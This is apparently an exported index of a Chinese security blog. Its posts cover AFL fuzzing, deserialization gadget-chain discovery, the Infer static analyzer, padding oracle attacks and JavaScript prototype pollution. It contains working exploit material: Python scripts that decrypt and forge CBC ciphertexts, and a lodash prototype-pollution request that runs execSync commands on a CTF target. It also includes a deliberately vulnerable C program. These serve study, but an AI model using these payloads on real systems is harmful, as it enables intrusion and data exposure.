<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[AFL试用笔记]]></title>
    <url>%2Ffuzz-AFL%E8%AF%95%E7%94%A8%E7%AC%94%E8%AE%B0%2F</url>
    <content type="text"><![CDATA[AFL12makemake install 程序插桩&amp;编译有问题程序 1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;string.h&gt; int main(void)&#123; char login[32]; char passwd[32]; printf("Login: \n"); gets(login); printf("Password: \n"); gets(passwd); if (strcmp(login, "root") == 0) &#123; if (strcmp(passwd, "1qazxsw2") == 0) &#123; printf("Access Granted.\n"); return 0; &#125; &#125; printf("Access Denied.\n"); return 1;&#125; 编译 1afl-gcc -fno-stack-protector -z execstack vuln1.c -o vuln1 如果用make需要设置环境变量： 123git clone --depth=1 https://github.com/gittup/binutilsexport CC=afl-gccexport CXX=afl-g++ 准备输入种子创建输入输出目录： 1mkdir testcases results 在testcases下建立以下三个文件，AFL会读取每个文件的内容，将每一行输入到vuln1的标准输入中。1234| test1.txt | test2.txt | test3.txt || --------- | --------- | --------- || a | root | root || a | a | 1qazxsw2 | 种子精简afl-cmin工具需要一个给定的包含可能的（potential）test case的文件夹，然后运行每一个并将收到的反馈与所有其他的test case进行对比，找到最有效地表示最unique的代码路径的最好的test case。最好的test case被保存到一个新的目录。 afl-tmin工具只用于一个指定的文件。当我们进行fuzzing时，我们不想浪费CPU来处理一些相对于test case表示代码路径来说无用的bit或byte。为了使每一个test case达到表示与原始测试用例相同的代码路径所需的最小值，afl-tmin遍历test case的实际字节，逐步删除很小的数据块，直到删除任意字节都会影响到代码路径表示。 启动AFL12echo core &gt; /proc/sys/kernel/core_pattern # WSL不需要afl-fuzz -i ./testcases/ -o ./results/ ./vuln1 如果程序通过参数读取文件，可以用：1afl-fuzz -i afl_in -o afl_out ./binutils/readelf -a @@ 出现以下界面 查看crash1234567$ ls results/crashes/ -altotal 4drwx------ 1 root root 512 Sep 6 16:22 .drwxrwxrwx 1 root root 512 Sep 6 16:21 ..-rw------- 1 root root 611 Sep 6 16:21 fuzz-AFL试用笔记.txt-rw------- 1 root root 137 Sep 6 16:21 id:000000,sig:11,src:000000,op:havoc,rep:64-rw------- 1 root root 65 Sep 6 16:22 id:000001,sig:11,src:000002,op:havoc,rep:128 查看一个测试用例：1cat results/crashes/id:000000,sig:11,src:000000,op:havoc,rep:64 kelinciAFL端一个C程序作为接口，它与afl-gcc/g++编译出来的程序相同，将AFL的输入通过TCP发送给Java，再将执行结果返回返回给afl。在fuzzerside/下用make编译 JAVA端用于包装fuzz对象，建立一个TCP服务器，返回退出代码和路径信息。它在instrumentor/目录下用gradle build构建]]></content>
      <categories>
        <category>Fuzz</category>
      </categories>
      <tags>
        <tag>Fuzz</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Automated Discovery of Deserialization Gadget Chain解读]]></title>
    <url>%2Fdeserialize-AutoFindPOP%2F</url>
    <content type="text"><![CDATA[文章来自Automated Discovery of Deserialization Gadget Chains, Blackhat2018 文章：https://i.blackhat.com/us-18/Thu-August-9/us-18-Haken-Automated-Discovery-of-Deserialization-Gadget-Chains-wp.pdf 演讲视频：https://www.youtube.com/watch?v=wPbW6zQ52w8 工具：https://github.com/JackOfMostTrades/gadgetinspector 原理介绍看下来的感觉就是将jar包里的（可以反序列化的）所有类的属性设为污点（因为反序列化时攻击者都可以控制），接下来做污点传播，Source为toString()，equals()等方法，Sink为Runtime.exec()，Method.invoke()，URL.openStream等方法，而污点清除函数就是黑名单类中的所有函数。 Step1枚举包内的所有类和方法，对于类收集其父类和子类集合： Output: 123456789List&lt;ClassReference&gt; discoveredClasses ClassReference(name, superClass, interfaces isInterface, members) ClassReference.Handle(name)List&lt;MethodReference&gt; discoveredMethod MethodReference(classReference, name, desc, isStatic) MethodReference.Handle(classReference, name, desc)InheritanceMap //记录了一个类的父类和子类集合，因为一个类拥有其父类的所有方法 Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; inheritanceMap Map&lt;ClassReference.Handle, Set&lt;ClassReference.Handle&gt;&gt; subClassMap Step2发现函数传递的数据流，如代码段1中invoke可以传递对象value(0)，代码段2中invoke既可以传递arg(1)也可以传递value(0)，因为我们假设（a）受污染的对象中，所有成员变量都是受污染的（b）程序中所有分支都是可达的（污染传播都是这样做的），0和1为参数index，0代表this。在此之前要先分析函数调用关系，因为如果有A函数：FuncA(){return FuncB();}，那么A函数的返回与B函数有关。 output: 123Map&lt;MethodReference.Handle, Set&lt;Integer&gt;&gt; passthroughDataflow MethodReferenceHandle(classReference, name, desc) Set&lt;Integer&gt; // 返回一系列污点 0表示this，1为arg1 Step3构建调用图，即函数A将自身参数arg1传递给函数B的参数arg2 FuncA@1-&gt;FuncB@2 Output: 123Set&lt;GraphCall&gt; discoveredCalls GraphCall(caller.Method, targetMethod, callerArgIndex, callerargPath, targetArgIndex) // 调用函数, 被调函数, 调用函数传递参数idx，路径，被调函数传入参数idx 构图时，只考虑存在污点的边： 这里发现gadgetinspector.TaintTrackingMethodVisitor#getStackTaint有点问题，每次get的时候并未拿到Taint Step4枚举入口，如hashCode，toString，程序只能发现已知入口的POP链 Output： 12List&lt;Source&gt; discoveredSources Source(sourceMethod, taintedArgIndex) //index0=this Step5BFS搜索图找到chains 程序分析断点打gadgetinspector.GadgetInspector#main 污点传播（Step2-Step3）Step2-Step3都是通过ASM做的，例如Step3： 其中继承了基本Visitor： gadgetinspector.TaintTrackingMethodVisitor，该类模拟函数执行，主要污点传播逻辑都在这 visitMethodInsn字节码调用函数时会触发该函数，对于污点传播而言，应该做如下事情 从堆栈取出参数 检查函数的参数是否存在污点 返回函数结果是否存在污点 将结果推入堆栈 实际上就是模拟了一个函数的调用过程，如果函数中有嵌套调用那么情况会更复杂 其属性savedVariableState.StackVars记录着函数参数，及其是否有污点： 如上图，该函数（StringBuilder.append()）有两个参数，第一个参数是this，有污点，第二个参数无污点。 特殊的传播在gadgetinspector.TaintTrackingMethodVisitor#PASSTHROUGH_DATAFLOW处定义了一些特殊的传播，保证污点能够向后传播，比如说String类型A+Taint的传播，idx1，idx2，idx3分别是类，函数名，函数签名，后面是能够传播的污点参数idx，如StringBuilder.append()会将参数0，参数1传播： 而gadgetinspector.TaintTrackingMethodVisitor#visitMethodInsn这里需要处理函数参数调用传播污点的情况，如A(B(xxx)) SINK点Sink点定义在gadgetinspector.GadgetChainDiscovery#isSink： 判断该类是否可以反序列化对于java原生序列化，判断逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#applyNoCache，其他序列化方法找对应的包名。 黑名单对于java原生序列化，逻辑在：gadgetinspector.javaserial.SimpleSerializableDecider#isBlacklistedClass，可以追加黑名单。 程序的一个Issue原版污点传播存在一个Bug，考虑如下情况： 123456789101112class A &#123; String cmd; public String getcmd()&#123; return cmd; &#125;&#125;class B extends A &#123; public String func() throws Exception&#123; Runtime.getRuntime().exec(getcmd()); &#125;&#125; 这里程序无法发现gadget，因为在读取getcmd()字节码后，污点传播执行如下代码（TaintTrackingMethodVisitor.java#L675）向外传播污点： 这一意思是说，如果passthroughDataflow（第二步）计算得到getcmd能够传播污点，那么该污点将作为参数推入堆栈（即传播到exec()函数参数上），但是这里的passthroughDataflow并没有B.getcmd()的记录，只有A.getcmd()记录——因为B.getcmd()继承A.getcmd()，因此污点传播中断了。 因此需要寻找其父类查看是否有该方法，将图中的代码块换成如下： 1234567891011121314151617181920212223242526272829if (passthroughDataflow != null) &#123; Set&lt;Integer&gt; passthroughArgs = passthroughDataflow.get(methodHandle); if (passthroughArgs == null &amp;&amp; inheritanceMap!=null) &#123; // FIXME ClassA-&gt;ClassB-&gt;ClassC // ClassA.func(), ClassB.func(), ClassC.func()==ClassB.func()!=ClassA.func(); // now taint will passthrough if ClassB.func() or ClassA.func() can passthrough. // So FP will arrise. Set&lt;ClassReference.Handle&gt; superClasses=inheritanceMap.getSuperClasses(clzHandle); if(superClasses!=null)&#123; for (ClassReference.Handle superClzHandle: superClasses)&#123; List&lt;Set&lt;Integer&gt;&gt; list=passthroughDataflow.entrySet().stream() .filter(e-&gt;(e.getKey().getClassReference().equals(superClzHandle) &amp;&amp; e.getKey().getName().equals(name) &amp;&amp; e.getKey().getDesc().equals(desc))) .map(e-&gt;e.getValue()) .collect(Collectors.toList()); if(!list.isEmpty())&#123; passthroughArgs=list.get(0); break; &#125; &#125; &#125; &#125; if (passthroughArgs != null) &#123; for (int arg : passthroughArgs) &#123; resultTaint.addAll(argTaint.get(arg)); &#125; &#125;&#125; 但是这样就还存在一个问题，因为gadgetinspector.data.InheritanceMap#getSuperClasses返回的是一个集合，因此，我们并没法知道真实调用exec()的是哪一个函数： 考虑如下例子： 123456789101112131415class A &#123; String cmd; public String getcmd()&#123; return cmd; &#125;&#125;class B extends A&#123; public String getcmd() &#123; return "whoami"; &#125;class C extends B&#123; public String func() throws Exception&#123; Runtime.getRuntime().exec(getcmd()); &#125;&#125; 在这里，前面的代码会返回getcmd()传播污点——父类的任意一个getcmd()能传污点就有污点，但是实际上其并没有污点，因为实际上getcmd()调用的是B.getcmd()，因此会产生误报，预计使用接口的话这一点会更加明显。 缺陷 无视控制流，导致误报 无法识别反射的SINK点，导致漏报 相关代码：https://github.com/Anemone95/gadgetinspector 附录：ASM源码其污点传播用ASM做的，因此记一下关于ASM的一些使用方法 ClassReaderClassVisitor定义在读取Class字节码时会触发的事件，如类头解析完成、注解解析、字段解析、方法解析等。 MethodVisitor定义在解析方法时触发的事件，如方法上的注解、属性、代码等。这里只是操作码不含操作数 visitInsn：IALOAD~SALOAD触发该函数 visitVarInsn(opcode, var)：ILOAD~ALOAD触发该函数，var为操作数 B4 getfield]]></content>
      <categories>
        <category>Web安全-反序列化</category>
      </categories>
      <tags>
        <tag>反序列化</tag>
        <tag>Javam</tag>
        <tag>自动化</tag>
        <tag>污点传播</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Infer试用以及扫描原理分析]]></title>
    <url>%2Fwhitebox-infer%2F</url>
    <content type="text"><![CDATA[Infer作为facebook 开源的使用 ocaml 开发静态代码检测工具，作为公司的产品调研对象，本文就其使用和原理两方面进行分析。 GitHub：https://github.com/facebook/infer 教程：https://infer.liaohuqiu.net/ Usage12345# Gradleinfer -- gradle &lt;gradle task, e.g. "build"&gt;infer -- ./gradlew &lt;gradle task, e.g. "build"&gt;# Maveninfer -- mvn &lt;maven target&gt; 检测能力官网上看到能够检测到的问题有： Java： Resource Leak Null dereference C and Objective-C Resource leak Memory leak Null dereference Parameter not null checked Ivar not null checked Premature nil termination argument Bugs reported only in Objective-C Retain cycle 参见：https://infer.liaohuqiu.net/docs/infer-bug-types.html 但是定位到源代码：https://github.com/facebook/whitebox-infer/blob/master/whitebox-infer/src/base/IssueType.ml后，发现其还能检测其存在注入类型的漏洞，不知为何没有扫描到。 试用Webgoat检测到16个问题，14个空引用和2个资源泄露： 扫描InsecureBankv2: 优势 增量分析 能够分析大规模程序 原理分离逻辑（separation logic）和双向假说推理（bi-abduction），霍尔逻辑和抽象解释，分离逻辑用来检测bug，双向假说推理用来做增量分析。 分离逻辑一开始用于内存管理的逻辑 x\mapsto y * y\mapsto x$x \mapsto y$ 指指针x指向值y（x points to y），$A*B$指A和B处于分离的两块内存中（and separately），因此以上公式被叫做（x 指向y，同时y指向x），可以用下图表示： 接着使用Hoare三元组${pre}prog{post}$，表示程序行为，$pre$指前置条件，$prog$指程序片段$post$为后置条件。例如使用Hoare三元组描述一个关闭资源的函数： \{r\mapsto open\}closeResource(r)\{r\mapsto closed\}(spec)它说明，一个正确的关闭资源的函数运行前，r资源应该是打开的，运行后r资源应该是关闭的，如果不符合则代码有问题。 那么若有两个资源$r_1$和$r_2$仅关闭$r_1$可以表示成： \{r_1\mapsto open * r_2\mapsto open\}closeResource(r_1)\{r_1\mapsto closed * r_2\mapsto open\}(use)这里使用了一个小规范（spec）去更新了一个大规范（use），更一般的，我们有： \{pre\}prog\{post\}\rightarrow\{pre*frame\}prog\{post*frame\}这一规则也被称为逻辑分离中的frame规则，$frame$描述了不变的状态，属于来自于就像动画场景中背景（frame）——动画场景中背景不会变。 这一规则用于数学推理，它揭示了逻辑推理应该聚焦于程序访问资源的那一块逻辑，并且分离的两块可以独立分析。 双向假说推理A推出B表示为： A \vdash B在传统逻辑推理中，一个推理问题被定义为： 给定假设A和目标G 找到一个M，使如下公式成立： A \land M \vdash G 应用到分离逻辑问题，即： A * M \vdash G双向假说推理将问题拓展成： A*?antiframe \vdash G*?frame即infer需要找到一对$antiframe$和$frame$让上式成立。 这在做增量扫描是很重要。 为了说明问题，例如我们有如下函数： 123456789101112lst_nd* q(lst_nd *y) &#123; // Inferred Pre: list(y) lst_nd *x, *z; x=malloc(sizeof(lst_nd)); x-&gt;tail=0; z=malloc(sizeof(lst_nd)); z-&gt;tail=0; // Abducted: list(y), Framed: z|-&gt;0 merge(x,y); // Obtained Post: list(x)*z|-&gt;0 merge(x,z); // Obtained Post: list(x) return(x);&#125; // Inferred Post: list(ret)void merge(lst_nd *x,lst_nd *y)&#123;//SUMMARY ONLY // Given Pre: list(x) * list(y) // x=x+y&#125; // Given Post: list(x) 要分析merge有没有空指针，有 \{x\mapsto list * y\mapsto list\}merge(x,y)\{x\mapsto list\}如果开始分析q到第5行，我们有： A=x\mapsto 0 *z \mapsto 0但是我们的前提条件是$G=x\mapsto list * y\mapsto list$那么开始推导： x\mapsto0 *z \mapsto 0 * ?antiframe \vdash x\mapsto list * y \mapsto list * ?frame因此 $antiframe=y\mapsto list$且$frame=z\mapsto 0$，这说明，如果想要分析q()函数有没有空指针，那么我们现在只需要分析$y\mapsto list$是成立就行了。 这意味着，如果将来发新版本，若q()函数不变，则不需要再分析该函数，只需要分析改变的那些函数有没有改变$y \mapsto list$即可。 总结Infer目前的检测能力只局限于空指针和数据泄露问题，然而在检测项中发现了更多，怀疑是开源的是缩水的版本，而其增量分析的思想值得扫描器借鉴，其可用来完成commit级别的SAST和Serveless的安全检测。]]></content>
      <categories>
        <category>源码安全</category>
      </categories>
      <tags>
        <tag>源码安全</tag>
        <tag>C/C++</tag>
        <tag>Infer</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PaddingOracle攻击]]></title>
    <url>%2Fcrypto-PaddingOracle%E6%94%BB%E5%87%BB%2F</url>
    <content type="text"><![CDATA[CBC加密原理先预习下CBC的加解密原理吧。 加密如下图所示，CBC的加密步骤如下： 对明文分组，每组长度通常为8或16字节，末尾分组需要填充，通常填充采用PKCS#5标准； 生成初始化向量IV，长度为分组长度； 对于第一个明文分组，先由IV异或明文分组1得到中间值，再通过对称加密（DES/AEC/etc）得到密文分组1； 对于接下来的分组，由上一个密文分组替代IV算得中间值，再通过对称加密（DES/AEC/etc）得到密文分组2,3,4…… 给出加密的Java代码： 12345678910public static String encrypt(String plain, String key) throws Exception &#123; byte[] keyBytes = key.getBytes(charset); byte[] plainBytes = plain.getBytes(charset); SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "DES"); Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding");//"算法/模式/补码方式" cipher.init(Cipher.ENCRYPT_MODE, keySpec); byte[] iv = cipher.getIV(); byte[] encrypted = cipher.doFinal(plain.getBytes(charset)); return bytes2HexStr(iv)+"::"+bytes2HexStr(encrypted);&#125; 可以看到，算法输入是明文（plain）和密钥（key），返回是初始化向量（iv）和加密后的密文（encrypted）。 解密如下图所示，CBC的解密步骤如下： 将密文分组； 对于第一个密文分组，先经过对称加密算法解密得到中间值，再由初始化向量IV异或中间值得到明文分组1； 对于接下来的密文分组，由经过对称加密算法解密得到中间值，再上一个密文分组代替IV异或得到明文分组2,3,4……； 给出Java版解密代码： 12345678910111213public static String decrypt(String secret, String key, String iv) throws Exception &#123; byte[] keyBytes = key.getBytes(charset); byte[] secretBytes = hexStr2Bytes(secret);//先用base64解密 byte[] ivBytes = hexStr2Bytes(iv); IvParameterSpec ivs = new IvParameterSpec(ivBytes); SecretKeySpec keySpec = new SecretKeySpec(keyBytes, "DES"); Cipher cipher = Cipher.getInstance("DES/CBC/PKCS5Padding"); cipher.init(Cipher.DECRYPT_MODE, keySpec, ivs); byte[] plain = cipher.doFinal(secretBytes); String plainString = new String(plain,charset); return plainString;&#125; 可见输入是密文（secret）、密码（key）、初始化向量（iv）——这正与加密的输入对应，输出是明文（plainString）。 PKCS#5填充方案这里再提一下PKCS#5方案，简单说就是缺多少位补多少，补内容就是缺位数的int值，例如：需要加密的串为“FIG”，而分组长度为8，那么缺5位，因此补完为“FIG\x05\x05\x05\x05\x05”，注意即使长度正巧为8，也需要补上一个完整分组，以检查加密正确性。 在解密完最后一个分组后，先会检查Padding是否合法（注意，这是发起Oracle Padding攻击的关键） com.sun.crypto.provider.CipherCore#unpad(): 12345678private int unpad(int len, byte[] intermidVal) throws BadPaddingException &#123; int ret = this.padding.unpad(intermidVal, 0, len); if (ret &lt; 0) &#123; throw new BadPaddingException("Given final block not properly padded. Such issues can arise if a bad key is used during decryption."); &#125; else &#123; return ret; &#125;&#125; com.sun.crypto.provider.PKCS5Padding#unpad(): 12345678910111213141516171819202122232425262728293031/** * @param plain 解密字符串 * @param startIdx 开始下标 * @param length 字符串长度 * @return paddingVal */public int unpad(byte[] plain, int startIdx, int length) &#123; if (plain != null &amp;&amp; length != 0) &#123; int totalLength = Math.addExact(startIdx, length); byte tailVal = plain[totalLength - 1]; // 解密后明文的最后一个字符 int unsignedTailVal = tailVal &amp; 255; if (unsignedTailVal &gt;= 1 &amp;&amp; unsignedTailVal &lt;= this.blockSize) &#123; int paddingStartIdx = totalLength - unsignedTailVal; // tailVal==unsignedTailVal if (paddingVal &lt; startIdx) &#123; return -1; &#125; else &#123; for(int i = paddingStartIdx; i &lt; totalLength; ++i) &#123; if (plain[i] != tailVal) &#123; return -1; &#125; &#125; return paddingVal; &#125; &#125; else &#123; return -1; &#125; &#125; else &#123; return 0; &#125;&#125; 推导原中间值假设plain=123456789，key=keykeyke，加密得到iv(hexcoded)=c86518374d219a7e,secret(hexcoded)=c8c9c4f092468f9e75b520a3ea1832c0 作为攻击者，目前我们知晓的是iv和secret，攻击的第一步是调整iv得到中间值： 抽取第一块出来看，如果我们调用decode(&quot;c8c9c4f092468f9e&quot;,key,&quot;0000000000000000&quot;)——再次注意，能控制的只有secret和iv，key变量未知也不可控，上文函数势必会报错，因为Padding不合法： 那么此时（最可能）合法的Padding是什么呢？不难想到应该是0x01，即Plain Text &amp; Padding应该为”???????\x01“ 爆破辅助IV[-1]控制secret不变，IV清零，先爆破(合法的辅助)iv最后一位，若结束位为0x01则程序不再报错，反之程序报错（这里可以解释下上文说的“最可能”的含义，因为异或后有可能解密后plainText[-2]=0x02，那么合法的padding也可以是\0x02——也就是说结束位为0x02程序也不报错，也有可能plainText[-3]=plainText[-2]=0x03，那么合法的padding也可以是0x03，这样的概率出现的实在是太少了，即使是最后一个分组，由于我们已经清零了IV，因此也不会发生这种情况）。 因此有如下脚本，得到了合法的最后一位是“47”： 12345678def burp_iv(secret: bytearray, iv: bytearray, pos: int)-&gt;int: for iv_byte in range(256): iv[pos]=iv_byte #对java的函数的封装，当报错时返回-1。 ret=decode(secret, iv) logging.info("&#123;0&#125;::&#123;1&#125;".format(iv.hex(),ret)) if ret!=-1: return iv_byte 更新中间值根据上文分析，我们猜测最后一位padding是0x01，并且?^0x47=0x01，那么?=0x01^0x47=0x46，由此中间值的最后一位就是0x46。 1234legal_iv_byte=burp_iv(secret, fake_legal_iv,i) # 0x47# 更新intermediary valueintermedi_byte=padding^legal_iv_byte # 0x01^0x47 intermedi[i]=intermedi_byte # 0x46 更新辅助IV接下来推第二位，此时我们假设(最有可能的合法)padding值应该是0x02，首先让最后一位合法——IV[-1]^0x46=0x02，即更新IV[-1]=0x02^0x46=0x44 1234# 更新ivpadding+=1 # padding=0x02legal_iv_byte=padding^intermedi_byte # 0x44fake_legal_iv[-1]=legal_iv_byte 爆破辅助IV[:-2]用爆破第一位的相同方法，得到第二位IV为0xAF，再得到第二位中间值为0xAD： 再更新辅助IV爆破第三位，以此类推，可以整个中间值f9572b037817ad46： 即最多花费256*len(block)次尝试，可以得到整个中间值，此时辅助IV的任务已经完成。 而此时，攻击者需要的只是secret和分组长度。 另外，不论对于哪一个分组（即使是最后一个填充分组），进行的操作都是一样的。 推导原明文知道中间值之后，由Intermediary ^ IV = Plain 推导原明文，注意这里是真实的IV，而不是之前的辅助IV。 1234567def burp_plain(intermedi: bytearray, iv: bytearray)-&gt;bytearray: block_len=len(intermedi) plain=bytearray.fromhex("00"*block_len) for i in range(block_len): plain[i]=intermedi[i]^iv[i] logging.info("Get Plain Value: &#123;&#125;".format(plain.hex())) return plain 对于第一个分组，IV就是初始IV；对于后面的分组，IV为上一分组的密文，以此可以推导全部明文： 1234567891011def decrypt(secret: bytearray, iv: bytearray)-&gt;bytearray: plain=bytearray() block_len=len(iv) real_iv=iv for i in range(0,len(secret),8): block_secret=secret[i:i+8] intermedi=burp_intermediary(block_secret, block_len) plain+=burp_plain(intermedi, real_iv) real_iv=secret[i:i+8] logging.info("Get Full Plain: &#123;&#125;".format(plain.hex())) return plain 梳理一下，在知晓secret和iv的情况下，攻击者先推导中间值，接着推导原明文。 伪造明文推导出中间值后，可以伪造新明文： 12∵ intermediary ^ new_iv = fake_plain∴ fake_iv=intermediary ^ fake_plain 我们先构造一个长度在一个分组长度内的密文，比如“7654321”： PKCS#5填充，得到“7654321\x01” new_iv=b&quot;\xf9\x57\x2b\x03\x78\x17\xad\x46&quot; ^ b&quot;7654321\x01&quot;=b&quot;\xce\x61\x1e\x37\x4b\x25\x9c\x47&quot; decode(“c8c9c4f092468f9e”,key,“ce611e374b259c47”) = “7654321” 代码实现如下：1234567891011def encrypt_block(secret_block: bytearray, fake_plain: bytearray)-&gt;(bytearray, bytearray): block_len=len(secret_block) if len(fake_plain)&lt;block_len: fake_plain=pkcs5(fake_plain, block_len) intermedi=burp_intermediary(secret_block, block_len) iv=bytearray(block_len) for i in range(block_len): iv[i]=intermedi[i]^fake_plain[i] logging.info("Fake IV: &#123;0&#125;, Secret: &#123;1&#125;".format(iv.hex(), secret_block.hex())) return iv, secret_block 可以看到，算法输入实际上只有需要加密的明文（secret可以为任意值），输出实际上只有iv（secret原样返回）。 伪造任意长度的明文根据CBC的解密流程，将最后一块加密产生的IV作为倒数第二块的secret，以前的倒数第i块IV作为倒数第i-1块的secret，依次向前算得所有密文，最后产生的IV作为初始IV。 1234567891011def encrypt(plain: bytearray, block_len: int)-&gt;bytearray: idxs=list(range(0, len(plain), block_len)) secret=bytearray() secret_block=bytearray(block_len) for idx in idxs[::-1]: iv, secret_block=encrypt_block(secret_block, plain[idx:idx+8]) secret=secret_block+secret secret_block=iv logging.info("IV: &#123;0&#125;, Secret: &#123;1&#125;".format(iv.hex(), secret.hex())) return iv, secret 总结整理一下，在攻击者知晓加密方式为AES/DES-CBC，密文以及初始化向量长度后，可以解密原中间值；攻击者知晓密文以及初始化向量值后，可以进一步解密原明文；攻击者在只知晓加密方式为AES/DES-CBC情况下，可以伪造明文，当然整个大前提是攻击者可以多次调用解密程序，并且解密程序在padding不合法时报错。 代码：https://github.com/Anemone95/padding-oracle-attack 相关资料 Automated Padding Oracle Attacks With PadBuster，https://blog.gdssecurity.com/labs/2010/9/14/automated-padding-oracle-attacks-with-padbuster.html Padding Oracle，https://www.jianshu.com/p/1851f778e579]]></content>
      <categories>
        <category>密码学</category>
      </categories>
      <tags>
        <tag>密码学</tag>
        <tag>CBC</tag>
        <tag>PaddingOracle</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JavaScript原型链污染学习笔记]]></title>
    <url>%2FJS-%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93%2F</url>
    <content type="text"><![CDATA[prototype和__proto__prototypeJavascript的类是通过构造函数创建的，而给类增加方法则需要使用prototype，类似于设计模式中的原型模式： 12345678910function Foo() &#123; this.bar = 1&#125;Foo.prototype.show = function show() &#123; console.log(this.bar)&#125;let foo = new Foo()foo.show() __proto__prototype只能在类（换句话说，构造函数）上使用，如果想在实体化的类上使用则需要使用__proto__属性，即： 1foo.__proto__.show == Foo.prototype.show 原型链继承子类将其prototype赋值为一个父类对象实例，表示其继承父类。对于子对象的属性，若其不存在，则会递归查找其父对象，举例说明： 12345678910111213function Father() &#123; this.first_name = 'Donald' this.last_name = 'Trump'&#125;function Son() &#123; this.first_name = 'Melania'&#125;Son.prototype = new Father()let son = new Son()console.log(`Name: $&#123;son.first_name&#125; $&#123;son.last_name&#125;`) //输出Melania Trump 对于对象son，在调用son.last_name的时候，实际上JavaScript引擎会进行如下操作： 在对象son中寻找last_name 如果找不到，则在son.__proto__中寻找last_name 如果仍然找不到，则继续在son.__proto__.__proto__中寻找last_name 依次寻找，直到找到null结束。比如，Object.prototype的__proto__就是null 原型链污染考虑以下情况，如果使用son.__proto__.name=&quot;son&quot;，那么会造成daughter.name=son 1234567891011121314151617// son是一个简单的JavaScript对象let son = &#123;name: "mike"&#125;// son.name="mike"console.log(son.name)// 修改son的原型（即Object）son.__proto__.name = "poison"// 由于查找顺序的原因，foo.bar仍然是1console.log(son.name)// 此时再用Object创建一个空的zoo对象let daughter = &#123;&#125;// 查看daughter.name(daughter.name="poison")console.log(daughter.name) foo.__proto__==zoo.__proto__==object 发生场景js中的merge、clone操作：123456789function merge(target, source) &#123; for (let key in source) &#123; if (key in source &amp;&amp; key in target) &#123; merge(target[key], source[key]) &#125; else &#123; target[key] = source[key] &#125; &#125;&#125; 利用方法失败的利用：1234567let o1 = &#123;&#125;let o2 = &#123;a: 1, "__proto__": &#123;b: 2&#125;&#125;merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 成功的利用：1234567let o1 = &#123;&#125;let o2 = JSON.parse('&#123;"a": 1, "__proto__": &#123;"b": 2&#125;&#125;')merge(o1, o2)console.log(o1.a, o1.b)o3 = &#123;&#125;console.log(o3.b) 解释:失败利用的__proto__实际上是使o2的__proto__为{b:2}，即o2.__proto__={b:2}，这样for遍历时指挥遍历a,b，而不会遍历到__proto__。 成功方法的JSON.parse会使o2的__proto__为一个普通的键名称，所以在let o2 = JSON.parse(&#39;{&quot;a&quot;: 1, &quot;__proto__&quot;: {&quot;b&quot;: 2}}&#39;)后o2的原型是没有b属性的，而在merge后会将o2的原型（object）增加一个b属性。 例题参考p神出的Code-Breaking 2018 Thejs 题目： 1234567891011121314151617181920212223242526//...const lodash = require('lodash')//...app.engine('ejs', function (filePath, options, callback) &#123; // define the template engine fs.readFile(filePath, (err, content) =&gt; &#123; if (err) return callback(new Error(err)) let compiled = lodash.template(content) //source let rendered = compiled(&#123;...options&#125;) return callback(null, rendered) &#125;)&#125;)//...app.all('/', (req, res) =&gt; &#123; let data = req.session.data || &#123;language: [], category: []&#125; if (req.method == 'POST') &#123; data = lodash.merge(data, req.body) req.session.data = data &#125; res.render('index', &#123; language: data.language, category: data.category &#125;)&#125;) source，用户输入的body传入merge方法:1lodash.merge(data, req.body) sink为lodash.template()： 1234567// Use a sourceURL for easier debugging.var sourceURL = 'sourceURL' in options ? '//# sourceURL=' + options.sourceURL + '\n' : '';// ...var result = attempt(function() &#123; return Function(importsKeys, sourceURL + 'return ' + source) .apply(undefined, importsValues);&#125;); Function(arg1,arg2,…,funcbody)，可以建立一个匿名函数，举例子更好说明： Function.apply(object, args)可以调用该函数，可以理解为object.function(arg1, arg2)，args=[arg1, arg2]，例如： 再解释一下attempt： 1234567var attempt = baseRest(function(func, args) &#123; try &#123; return apply(func, undefined, args); &#125; catch (e) &#123; return isError(e) ? e : new Error(e); &#125;&#125;); 可以看到attempt的输入参数是(func[,args])，考虑到js特性——假设function(arg1,arg2,arg3)定义的函数有三个参数，其调用时参数个数可以小于3，实际相当于func.apply()。 有缺陷的Payload根据上面的分析，可以通过原型污染到object，使options也有sourceURL属性，构造出如下的payload： 123456789101112131415POST / HTTP/1.1Host: 192.168.70.138:8086Content-Length: 198Cache-Control: max-age=0Origin: http://192.168.70.138:8086Upgrade-Insecure-Requests: 1Content-Type: application/jsonUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3377.1 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Referer: http://192.168.70.138:8086/Accept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.9,en;q=0.8Connection: close&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125; 解释一下payload，e=&gt;{return ...}是ES6的匿名函数创建语法，相当于 123function(e)&#123; return ...;&#125; 之所以将sourceURL的返回值定义为“另一个函数”，再由“另一个函数”返回系统命令执行结果，是因为原本的设计Function(importsKeys, sourceURL + &#39;return &#39; + source)中的source就是返回一个function的，因为现在提前return，考虑幂等原理，修改后的返回也要是function 执行结果如下 注意，ping命令不能用，因为nodejs没有权限，Content-Type需要改为json（nodejs默认接受json格式）。 优化payload上面的payload已经可以攻击成功，但是存在一个弊端就是在程序重启之前，整个原型链都会受到污染带来的影响，导致后面用户因为原型已经被污染而无法获取正常服务： 需要用for循环把之前的污染删掉，这也就成了p神帖子里面的payload： 1&#123;"__proto__": &#123;"sourceURL": "\u000areturn e =&gt; &#123; for (var a in &#123;&#125;)&#123;delete Object.prototype[a];&#125; return global.process.mainModule.constructor._load('child_process').execSync('uname -a')&#125;\u000a//"&#125;&#125; 